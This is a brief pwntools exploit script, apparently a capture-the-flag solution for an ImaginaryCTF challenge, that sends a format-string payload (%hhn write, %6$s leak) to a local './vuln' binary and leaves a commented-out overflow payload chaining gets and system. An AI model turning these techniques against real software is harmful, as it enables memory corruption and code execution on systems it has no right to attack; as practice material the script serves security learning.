from pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
p = elf.process()
# p = remote(b"form.chal.imaginaryctf.org", 1337)
# payload = b"a"*72 + p64(elf.plt.gets) + p64(elf.plt.system)

payload = "%c"*5
payload += "%{}c%hhn".format(0xa0-5)
payload += "#%6$s"
pause()
print(len(payload))
p.sendline(payload)

p.interactive()